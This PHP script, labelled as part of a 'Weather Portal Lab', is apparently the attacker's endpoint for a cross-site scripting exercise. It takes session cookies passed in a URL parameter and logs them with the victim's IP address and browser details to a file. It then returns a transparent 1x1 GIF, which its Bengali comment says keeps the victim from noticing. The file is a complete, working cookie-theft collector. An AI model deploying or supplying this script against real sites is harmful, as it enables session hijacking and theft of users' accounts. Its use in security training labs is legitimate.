<?php
// 🌦️ Weather Portal Lab - Attacker's Cookie Capture Script

$logFile = 'stolen_cookies.txt';

if (isset($_GET['c'])) {
    $cookie = $_GET['c'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $date = date('Y-m-d H:i:s');
    
    $logEntry = "--- 🎯 WEATHER PORTAL: STOLEN COOKIE ---\n";
    $logEntry .= "Date: $date\n";
    $logEntry .= "Operator IP: $ip\n";
    $logEntry .= "Browser Agent: $userAgent\n";
    $logEntry .= "Session Cookie: $cookie\n";
    $logEntry .= "---------------------------------------\n\n";
    
    // stolen_cookies.txt ফাইলে কুকিগুলো অ্যাপেন্ড (Append) করে সেভ করা হচ্ছে
    if (file_put_contents($logFile, $logEntry, FILE_APPEND) === false) {
        error_log("Failed to write to $logFile. Check folder permissions.");
    }
    
    // ভিকটিম যেন বুঝতে না পারে, সেজন্য একটি 1x1 transparent GIF ইমেজ রিটার্ন করা হচ্ছে
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
    exit;
}
?>
